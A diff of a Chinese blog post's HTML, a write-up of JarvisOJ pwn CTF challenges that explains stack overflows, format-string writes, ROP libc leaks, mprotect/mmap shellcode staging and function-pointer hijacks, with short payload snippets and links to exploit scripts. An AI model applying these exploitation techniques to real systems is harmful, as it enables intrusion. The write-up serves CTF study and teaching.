 <span class="c1"># 或者使用 fmtstr_payload()</span>
-<span class="n">payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">11</span><span class="p">,</span> <span class="p">{</span><span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./fm&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;x&#39;</span><span class="p">]:</span> <span class="mi">4</span><span class="p">})</span></code></pre></td></tr></table>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">11</span><span class="p">,</span> <span class="p">{</span><span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./fm&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;x&#39;</span><span class="p">]:</span> <span class="mi">4</span><span class="p">})</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p><a href="https://github.com/bash-c/pwn_repo/blob/master/jarvisOJ_fm/solve.py">exploit here</a></p>
-
+</div><p><a href="https://github.com/bash-c/pwn_repo/blob/master/jarvisOJ_fm/solve.py">exploit here</a></p>
 <h2 id="backdoor-200">Backdoor (200)</h2>
-
 <p>一个 windows 的题目，其实更像一个逆向题目。</p>
-
 <p>在 <code>sub_401000</code> 函数中存在栈溢出</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -846,13 +816,13 @@
   <span class="o">*</span><span class="p">(</span><span class="n">_WORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">Dest</span><span class="p">[</span><span class="mi">30</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
   <span class="n">strcpy</span><span class="p">(</span><span class="n">Dest</span><span class="p">,</span> <span class="n">Source</span><span class="p">);</span>                         <span class="c1">// overflow
 </span><span class="c1"></span>  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-<span class="p">}</span></code></pre></td></tr></table>
+<span class="p">}</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>Source 是由 argv[1] 以及程序中的 xor，qmemcpy 等操作共同决定的。看一下进行了哪些操作</p>
+</div><p>Source 是由 argv[1] 以及程序中的 xor，qmemcpy 等操作共同决定的。看一下进行了哪些操作</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -921,15 +891,14 @@
   <span class="n">strcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">Dest</span><span class="p">[</span><span class="n">offset</span> <span class="o">+</span> <span class="mi">29</span><span class="p">],</span> <span class="n">v3</span><span class="p">);</span>
   <span class="n">sub_401000</span><span class="p">(</span><span class="n">Dest</span><span class="p">);</span>
   <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-<span class="p">}</span></code></pre></td></tr></table>
+<span class="p">}</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>大致的处理流程是用户传给程序的参数 (argv[1]) 亦或 0x6443 后作为一个偏移量，然后 <code>jmp esp，nops，shellcode</code> 等依次 copy 到 Dest[offset] 上，最后在 <strong>sub_401000()</strong> 里触出栈溢出(本来不知道 0x7FFA4512 是什么，搜了一下才发现这是 windows 下的一个 <a href="https://blog.csdn.net/gxustudent/article/details/6624530">万能 jmp esp</a>)</p>
-
+</div><p>大致的处理流程是用户传给程序的参数 (argv[1]) 亦或 0x6443 后作为一个偏移量，然后 <code>jmp esp，nops，shellcode</code> 等依次 copy 到 Dest[offset] 上，最后在 <strong>sub_401000()</strong> 里触出栈溢出(本来不知道 0x7FFA4512 是什么，搜了一下才发现这是 windows 下的一个 <a href="https://blog.csdn.net/gxustudent/article/details/6624530">万能 jmp esp</a>)</p>
 <p>看一下 <strong>sub_401000()</strong> 的栈结构，控制 <code>jmp esp</code> 为返回地址即可触发后门，也即是 <strong>offset ^ 0x6443 == 0x20 + 4</strong> 即可</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -940,13 +909,13 @@
 <span class="err">-00000001</span>                 <span class="nf">db</span> <span class="err">?</span> <span class="c">; undefined
 </span><span class="c"></span><span class="err">+</span><span class="mi">00000000</span>  <span class="no">s</span>              <span class="no">db</span> <span class="mi">4</span> <span class="no">dup</span><span class="p">(</span><span class="err">?</span><span class="p">)</span>
 <span class="err">+00000004</span>  <span class="nf">r</span>              <span class="no">db</span> <span class="mi">4</span> <span class="no">dup</span><span class="p">(</span><span class="err">?</span><span class="p">)</span>
-<span class="err">+00000008</span> <span class="nf">Source</span>          <span class="no">dd</span> <span class="err">?</span></code></pre></td></tr></table>
+<span class="err">+00000008</span> <span class="nf">Source</span>          <span class="no">dd</span> <span class="err">?</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>因此可以得到该参数和 flag</p>
+</div><p>因此可以得到该参数和 flag</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -962,7 +931,7 @@
 </span></code></pre></td>
 <td class="lntd">
 <pre class="chroma"><code class="language-python" data-lang="python"><span class="n">jarvisOJ_Backdoor</span> <span class="p">[</span><span class="n">master</span><span class="err">●●●</span><span class="p">]</span> <span class="n">cat</span> <span class="n">solve</span><span class="o">.</span><span class="n">py</span> 
-<span class="ch">#!/usr/bin/env python</span>
+<span class="c1">#!/usr/bin/env python</span>
 <span class="c1"># -*- coding: utf-8 -*-</span>
 
 <span class="kn">from</span> <span class="nn">hashlib</span> <span class="kn">import</span> <span class="n">sha256</span>
@@ -973,39 +942,27 @@
 <span class="k">print</span> <span class="n">key</span>
 <span class="n">key</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">key</span><span class="p">)[</span><span class="mi">2</span><span class="p">:</span> <span class="p">]</span>
 
-<span class="k">print</span> <span class="s2">&#34;PCTF{</span><span class="si">%s</span><span class="s2">}&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">sha256</span><span class="p">(</span><span class="n">key</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">)[::</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">())</span></code></pre></td></tr></table>
+<span class="k">print</span> <span class="s2">&#34;PCTF{</span><span class="si">%s</span><span class="s2">}&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">sha256</span><span class="p">(</span><span class="n">key</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">)[::</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">())</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<h2 id="xman-level3-x64-250">[XMAN]level3(x64) (250)</h2>
-
-<p>与 level3 相比，只在函数传参上有区别，按照 x64 的函数调用约定 leak 出 libc，然后 rop 执行 system(&ldquo;/bin/sh&rdquo;) 即可。</p>
-
+</div><h2 id="xmanlevel3x64-250">[XMAN]level3(x64) (250)</h2>
+<p>与 level3 相比，只在函数传参上有区别，按照 x64 的函数调用约定 leak 出 libc，然后 rop 执行 system(&quot;/bin/sh&quot;) 即可。</p>
 <p>值得注意的是，这道题目中没有 puts，因此 leak libc 只能通过 <code>write(1, elf.got['write'], 8)</code>，但 ROPgadget 等工具只能找到控制 rdi 和 rsi 的 gadget，也就是我们不能控制 write 输出的长度，这时候有两种方法：</p>
-
 <p>一是使用 64 位 elf 的 <a href="https://www.cnblogs.com/Ox9A82/p/5487725.html">通用 gadget</a>；</p>
-
 <p>二是通过调试发现 write 时 rdx 是大于 8 的（实际上大于 6 即可），因此可以完全不用考虑控制 rdx。</p>
-
 <p><a href="https://github.com/bash-c/pwn_repo/tree/master/jarvisOJ_level3_x64">exploit here</a></p>
-
-<h2 id="xman-level4-250">[XMAN]level4 (250)</h2>
-
+<h2 id="xmanlevel4-250">[XMAN]level4 (250)</h2>
 <p>这道题目与 level3 相比没有提供 libc，因此就不能通过 leak libc 的方式来找 system 和 /bin/sh 的地址了。pwntools 中有个很有用的函数 <a href="http://docs.pwntools.com/en/stable/dynelf.html?highlight=DynELF#module-pwnlib.dynelf">DynELF</a>，可以在能控制 leak 内容的情况下leak 出某些函数的地址（如 system）。</p>
-
 <p>和 level3 相似，这道题目可以构造 rop leak 出某些地址上的内容后返回到 _start，因此可以通过 DynELF 来 leak 出 system 的地址，再读入 /bin/sh\0 字符串既可以构造 rop 调用 <code>system(&quot;/bin/sh&quot;)</code></p>
-
 <blockquote>
 <p>DynELF 的原理可以看沐师傅的一篇 <a href="http://muhe.live/2016/12/24/what-DynELF-does-basically/">分析</a></p>
 </blockquote>
-
 <p><a href="https://github.com/bash-c/pwn_repo/blob/master/jarvisOJ_level4/solve.py">exploit here</a></p>
-
 <h2 id="test-your-memory-300">Test Your Memory (300)</h2>
-
 <p>这道题目分数给高了，难度大概只是和 level2 相当，构造 rop chain 直接调用 <code>system(&quot;cat flag&quot;)</code> 即可，唯一需要注意的是程序最后有一个 strncmp，需要保证此时 strncmp 比较的两个两个地址都是可读的</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -1014,11 +971,12 @@
 <pre class="chroma"><code class="language-C" data-lang="C">  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">strncmp</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">s2</span><span class="p">,</span> <span class="mi">4u</span><span class="p">)</span> <span class="p">)</span>
     <span class="n">puts</span><span class="p">(</span><span class="s">&#34;good job!!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
   <span class="k">else</span>
-    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;cff flag is failed!!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span></code></pre></td></tr></table>
+    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;cff flag is failed!!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</code></pre></td></tr></table>
 </div>
 </div><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1031,9 +989,9 @@
 </span><span class="lnt">11
 </span><span class="lnt">12
 </span><span class="lnt">13
-</span></pre></td>
+</span></code></pre></td>
 <td class="lntd">
-<pre class="chroma">+-----------+
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">+-----------+
 |padding    |
 |......     |
 |           |
@@ -1045,17 +1003,15 @@
 |readable   | &lt;- mem_test 函数的参数，即 strncmp 比较的对象，需要保证该地址是可读的
 +-----------+
 |catflag    |
-+-----------+</pre></td></tr></table>
++-----------+
+</code></pre></td></tr></table>
 </div>
-</div>
-<p><a href="https://github.com/bash-c/pwn_repo/blob/master/jarvisOJ_Test_Your_Memory/solve.py">exploit here</a></p>
-
-<h2 id="xman-level5-300">[XMAN]level5 (300)</h2>
-
+</div><p><a href="https://github.com/bash-c/pwn_repo/blob/master/jarvisOJ_Test_Your_Memory/solve.py">exploit here</a></p>
+<h2 id="xmanlevel5-300">[XMAN]level5 (300)</h2>
 <p>题目假设禁用了 system 和 execve，并提示使用 <code>mprotect</code> 或者 <code>mmap</code>。先看一下这两个函数是什么作用，查看这两个函数的 man 手册</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1085,9 +1041,9 @@
 </span><span class="lnt">28
 </span><span class="lnt">29
 </span><span class="lnt">30
-</span></pre></td>
+</span></code></pre></td>
 <td class="lntd">
-<pre class="chroma">NAME
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">NAME
        mprotect — set protection of memory mapping
 
 SYNOPSIS
@@ -1116,37 +1072,27 @@ SYNOPSIS
 
 DESCRIPTION
        The mmap() function shall establish a mapping between an  address  space  of  a
-       process and a memory object.</pre></td></tr></table>
+       process and a memory object.
+</code></pre></td></tr></table>
 </div>
-</div>
-<h3 id="mprotect">mprotect</h3>
-
+</div><h3 id="mprotect">mprotect</h3>
 <p>mprotect 函数用于改变某段地址的权限（rwxp），mmap 用于申请一段空间，根据参数不同可以设置这段空间的权限。</p>
-
 <p>这道题目开启了 NX 保护，并假设禁用了 system 和 execve 函数（实际并没有），因此可以考虑通过 mprotect 改变 .bss/.data 权限或者通过 mmap 申请一段具有可执行权限的空间写 shellcode 的方法来 get shell，重点介绍如何使用 mprotect。</p>
-
 <ol>
 <li>第一次 rop 使用 <strong>write(1, elf.got[&lsquo;write&rsquo;], rdx)</strong> leak 出 libc 基地址</li>
 <li>第二次 rop 使用 <strong>mprotect(0x00600000, 0x1000, 7)</strong> 把 .bss 段设为有可执行权限</li>
 <li>第三次 rop 通过 <strong>read(0, elf.bss() + 0x500, 0x100)</strong> 把 shellcode 读到 .bss 并返回到 shellcode</li>
 </ol>
-
 <p>需要注意的是第一次 rop 时，与 level3 相似，调试可以发现 rdx 是大于 6的，因此可以不用通用 gadget 来设置 rdx；</p>
-
 <p>但第二次使用 mprotect 时必须设置 rdx 寄存器，这时候我们已经 leak 除了 libc 基地址，因此可以<strong>使用 libc 中的 gadget 来设置 rdx</strong>，也不需要用通用 gadget。</p>
-
 <p>并且 <strong>mprotect 指定的内存区必须包含整个内存页，区间长度必须是页大小的整数倍</strong>。</p>
-
 <p><a href="https://github.com/bash-c/pwn_repo/blob/master/jarvisOJ_level5/exp_mprotect.py">exploit here</a></p>
-
 <h3 id="mmap">mmap</h3>
-
 <p>mmap 可以申请一段空间，但麻烦在需要控制 6 个参数，对 64 位的程序而言，也就是需要找到能控制 <code>rdi, rsi, rdx, rcx, r8, r9</code> 的 gadget。</p>
-
 <p>刚开始尝试了 <a href="http://www.anquan.us/static/drops/binary-10638.html">_dl_runtime_resolve</a> 中的 gadget，但实际调试的过程中发现因为版本不一致，这个 gadget 已经不能用了。后来找了很久这样的 gadget 但没找到，就放弃了。再后来偶然发现 angelboy 的 <a href="https://github.com/scwuaptx/Pwngdb">Pwngdb</a> 的 magic 命令中有一个 <code>setcontext+0x35</code>，看一下具体是什么。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-assembly" data-lang="assembly"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1188,7 +1134,7 @@ DESCRIPTION
 </span><span class="lnt">40
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-assembly" data-lang="assembly">pwndbg&gt; magic
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">pwndbg&gt; magic
 ========== function ==========
 system:0x42510
 execve:0xc4860
@@ -1227,40 +1173,33 @@ pwndbg&gt; x/20i 0x7ffff781a000+0x44f05
    0x7ffff785ef4f &lt;setcontext+127&gt;:	ret    
    0x7ffff785ef50 &lt;setcontext+128&gt;:	mov    rcx,QWORD PTR [rip+0x36ef11]        # 0x7ffff7bcde68
    0x7ffff785ef57 &lt;setcontext+135&gt;:	neg    eax
-   0x7ffff785ef59 &lt;setcontext+137&gt;:	mov    DWORD PTR fs:[rcx],eax</code></pre></td></tr></table>
+   0x7ffff785ef59 &lt;setcontext+137&gt;:	mov    DWORD PTR fs:[rcx],eax
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>一段几乎能控制所有寄存器的 gadget ！前提是能控制 rdi，这个就很容易了，直接使用 <code>pop rdi; ret</code> 即可。</p>
-
+</div><p>一段几乎能控制所有寄存器的 gadget ！前提是能控制 rdi，这个就很容易了，直接使用 <code>pop rdi; ret</code> 即可。</p>
 <p>因此我的使用 mmap 的思路是：</p>
-
 <ol>
 <li>第一次 rop 执行 <code>write(1, elf.got['write'], rdx)</code> 来 leak libc，然后返回 <code>_start</code></li>
-<li>第二次 rop<br />
-
+<li>第二次 rop
 <ul>
 <li>执行 <code>read(0, elf.bss() + 0x300, 0x400)</code>，把寄存器的值读取到 bss 段，方便后续控制</li>
 <li>通过 <code>pop rdi; ret</code> 控制 rdi 指向 bss 段的地址</li>
 <li>返回 <code>setcontext+95</code> 控制 6 个寄存器</li>
 <li>返回 <code>mmap</code>，根据设置的寄存器申请出 rwx 的空间</li>
 <li>返回 <code>_start</code></li>
-</ul></li>
+</ul>
+</li>
 <li>第三次 rop 执行 <code>read(0, 0x12345000, 0x400)</code> 把 shellcode 读到 0x12345000(我 mmap 出的空间)，然后返回到该地址即可。</li>
 </ol>
-
 <p><a href="https://github.com/bash-c/pwn_repo/blob/master/jarvisOJ_level5/exp_mmap.py">exploit here</a></p>
-
 <h2 id="add-300">Add (300)</h2>
-
 <p>一道 mips 的题目，环境的搭建同样可以参考我之前写过的一篇 <a href="http://m4x.fun/post/arm_pwn/">分析</a>。而IDA 的 hexray 对 mips 没有太好的支持，可以使用 <a href="https://www.pnfsoftware.com/jeb/mips">jeb-mips</a> 或者 <a href="https://github.com/avast-tl/retdec">retdec</a> 来反编译，但实际效果也只是能看，最准确的方法还是直接读汇编。</p>
-
 <p>先看输入的部分，输入遇到 <code>\n</code> 才会停止，因此存在栈溢出
-<img src="http://ww1.sinaimg.cn/large/006AWYXBly1fvdqm86lp4j308h0bwmy2.jpg" alt="" /></p>
-
+<img src="http://ww1.sinaimg.cn/large/006AWYXBly1fvdqm86lp4j308h0bwmy2.jpg" alt=""></p>
 <p>同时程序中有一处打印栈上输入地址的</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -1279,13 +1218,13 @@ pwndbg&gt; x/20i 0x7ffff781a000+0x44f05
 <span class="nf">lw</span>      <span class="no">$gp</span><span class="p">,</span> <span class="mi">0x98</span><span class="err">+</span><span class="no">var_88</span><span class="p">(</span><span class="no">$sp</span><span class="p">)</span>
 <span class="nf">move</span>    <span class="no">$v1</span><span class="p">,</span> <span class="no">input</span>
 <span class="nf">b</span>       <span class="no">loc_400984</span>
-<span class="nf">li</span>      <span class="no">$s2</span><span class="p">,</span> <span class="mi">0x80</span></code></pre></td></tr></table>
+<span class="nf">li</span>      <span class="no">$s2</span><span class="p">,</span> <span class="mi">0x80</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>跳转过来的条件是 <code>strcmp(input, s4)</code> 相等</p>
+</div><p>跳转过来的条件是 <code>strcmp(input, s4)</code> 相等</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -1300,13 +1239,13 @@ pwndbg&gt; x/20i 0x7ffff781a000+0x44f05
 </span><span class="c"></span><span class="no">move</span>    <span class="no">$a1</span><span class="p">,</span> <span class="no">$s4</span>         <span class="c"># s2
 </span><span class="c"></span><span class="no">lw</span>      <span class="no">$gp</span><span class="p">,</span> <span class="mi">0x98</span><span class="err">+</span><span class="no">var_88</span><span class="p">(</span><span class="no">$sp</span><span class="p">)</span>
 <span class="nf">beqz</span>    <span class="no">$v0</span><span class="p">,</span> <span class="no">loc_400B5C</span>
-<span class="nf">move</span>    <span class="no">$a0</span><span class="p">,</span> <span class="no">input</span>       <span class="err">#</span> <span class="no">s</span></code></pre></td></tr></table>
+<span class="nf">move</span>    <span class="no">$a0</span><span class="p">,</span> <span class="no">input</span>       <span class="c"># s
+</span></code></pre></td></tr></table>
 </div>
-</div>
-<p>再向上找 s4 是什么</p>
+</div><p>再向上找 s4 是什么</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1341,36 +1280,31 @@ pwndbg&gt; x/20i 0x7ffff781a000+0x44f05
 <span class="nf">la</span>      <span class="no">$a1</span><span class="p">,</span> <span class="no">aD</span>          <span class="c"># &#34;%d&#34;
 </span><span class="c"></span><span class="no">move</span>    <span class="no">$a2</span><span class="p">,</span> <span class="no">$v0</span>
 <span class="nf">jalr</span>    <span class="no">$t9</span> <span class="c">; sprintf    # sprintf(s4, &#34;%d&#34;, rand())
-</span><span class="c"></span><span class="no">move</span>    <span class="no">$a0</span><span class="p">,</span> <span class="no">$s4</span>         <span class="err">#</span> <span class="no">s</span></code></pre></td></tr></table>
+</span><span class="c"></span><span class="no">move</span>    <span class="no">$a0</span><span class="p">,</span> <span class="no">$s4</span>         <span class="c"># s
+</span></code></pre></td></tr></table>
 </div>
-</div>
-<p>大致流程是</p>
+</div><p>大致流程是</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
 <pre class="chroma"><code class="language-C" data-lang="C"><span class="n">srand</span><span class="p">(</span><span class="mh">0x123456</span><span class="p">);</span>
 <span class="kt">int</span> <span class="n">tmp</span> <span class="o">=</span> <span class="n">rand</span><span class="p">();</span>
-<span class="n">sprintf</span><span class="p">(</span><span class="n">s4</span><span class="p">,</span> <span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="n">tmp</span><span class="p">);</span></code></pre></td></tr></table>
+<span class="n">sprintf</span><span class="p">(</span><span class="n">s4</span><span class="p">,</span> <span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="n">tmp</span><span class="p">);</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>随机种子是固定的，也即是随机值固定，因此 s4 的值也就知道了，通过这个功能我们能得到栈上输入的地址，程序没有开 NX 保护，输入 shellcode，并返回到 shellcode 即可。</p>
-
+</div><p>随机种子是固定的，也即是随机值固定，因此 s4 的值也就知道了，通过这个功能我们能得到栈上输入的地址，程序没有开 NX 保护，输入 shellcode，并返回到 shellcode 即可。</p>
 <p>通过调试可以快速确定覆盖返回地址所需的偏移量。</p>
-
 <p><a href="https://github.com/bash-c/pwn_repo/blob/master/jarvisOJ_add/solve.py">exploit here</a></p>
-
-<h2 id="61dctf-calc-exe-300">[61dctf]calc.exe (300)</h2>
-
+<h2 id="61dctfcalcexe-300">[61dctf]calc.exe (300)</h2>
 <p>这道题没开 NX 保护，很大概率就是使用 shellcode 来 get shell 了。这个题目主要麻烦在代码量太大，还是 strip 后的 binary，看起来很是费力。</p>
-
 <p>但这种代码量大的题目一般漏洞都很明显（代码量又大漏洞又难找，那题还怎么做），仔细分析，程序中存在一个如下的结构体（不是完全正确，程序没有看完）</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -1385,15 +1319,14 @@ pwndbg&gt; x/20i 0x7ffff781a000+0x44f05
 	<span class="kt">char</span> <span class="o">*</span><span class="n">type</span><span class="p">;</span>
 	<span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">method</span><span class="p">)();</span>
 	<span class="kt">int</span> <span class="n">len</span><span class="p">;</span>
-<span class="p">}</span></code></pre></td></tr></table>
+<span class="p">}</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>所有的变量和函数以这种结构体的形式存储，其中有一个很敏感的函数指针，如果能控制函数指针，就能控制 eip 了。</p>
-
+</div><p>所有的变量和函数以这种结构体的形式存储，其中有一个很敏感的函数指针，如果能控制函数指针，就能控制 eip 了。</p>
 <p>再往下看，程序有一个 <code>var</code> 可以声明变量，命令格式为 <code>var variable = &quot;value&quot;</code></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1444,32 +1377,28 @@ pwndbg&gt; x/20i 0x7ffff781a000+0x44f05
             <span class="n">v3</span> <span class="o">=</span> <span class="n">set_str</span><span class="p">(</span><span class="n">argv1</span><span class="p">,</span> <span class="n">nptra</span><span class="p">);</span>
             <span class="n">store_into_list</span><span class="p">(</span><span class="n">g_list</span><span class="p">,</span> <span class="n">argv1</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">v3</span><span class="p">);</span>
           <span class="p">}</span>
-        <span class="p">}</span></code></pre></td></tr></table>
+        <span class="p">}</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>但 store_into_list() 函数寻址时是通过变量名之间的比较进行的，也即是即使 <code>var add = &quot;eval&quot;</code> 也是程序允许的，这样我们就可以控制函数指针了。因此直接把某个函数的 method 改成 shellcode 即可。</p>
-
+</div><p>但 store_into_list() 函数寻址时是通过变量名之间的比较进行的，也即是即使 <code>var add = &quot;eval&quot;</code> 也是程序允许的，这样我们就可以控制函数指针了。因此直接把某个函数的 method 改成 shellcode 即可。</p>
 <p><a href="https://github.com/bash-c/pwn_repo/blob/master/jarvisOJ_calc.exe/solve.py">exploit here</a></p>
-
 <h2 id="guess-300">Guess (300)</h2>
-
 <p>这个题目也更像一个逆向题，好在程序没有 strip，看起来比较清楚。</p>
-
 <p>程序先建立了一个 socket，之后的输入输出均通过该 socket 进行。主要逻辑在 <code>is_flag_correct</code> 函数中，而漏洞也出在这里。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
 <pre class="chroma"><code class="language-C" data-lang="C">    <span class="n">value1</span> <span class="o">=</span> <span class="n">bin_by_hex</span><span class="p">[</span><span class="n">flag_hex</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">i</span><span class="p">]];</span>
-    <span class="n">value2</span> <span class="o">=</span> <span class="n">bin_by_hex</span><span class="p">[</span><span class="n">flag_hex</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]];</span></code></pre></td></tr></table>
+    <span class="n">value2</span> <span class="o">=</span> <span class="n">bin_by_hex</span><span class="p">[</span><span class="n">flag_hex</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]];</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>这里使用了下标寻址的方法，flag_hex 是我们的输入，类型是 char *，通过构造负数就可以寻址到 bin_by_hex 上方</p>
+</div><p>这里使用了下标寻址的方法，flag_hex 是我们的输入，类型是 char *，通过构造负数就可以寻址到 bin_by_hex 上方</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1536,19 +1465,16 @@ pwndbg&gt; x/20i 0x7ffff781a000+0x44f05
 </span><span class="c"></span><span class="p">-</span><span class="mi">0000000000000112</span>                 <span class="no">db</span> <span class="err">?</span> <span class="c">; undefined
 </span><span class="c"></span><span class="p">-</span><span class="mi">0000000000000111</span>                 <span class="no">db</span> <span class="err">?</span> <span class="c">; undefined
 </span><span class="c"></span><span class="p">-</span><span class="mi">0000000000000110</span> <span class="no">bin_by_hex</span>      <span class="no">db</span> <span class="mi">256</span> <span class="no">dup</span><span class="p">(</span><span class="err">?</span><span class="p">)</span>
-<span class="err">-0000000000000010</span>                 <span class="nf">db</span> <span class="err">?</span> <span class="err">;</span> <span class="no">undefined</span></code></pre></td></tr></table>
+<span class="err">-0000000000000010</span>                 <span class="nf">db</span> <span class="err">?</span> <span class="c">; undefined
+</span></code></pre></td></tr></table>
 </div>
-</div>
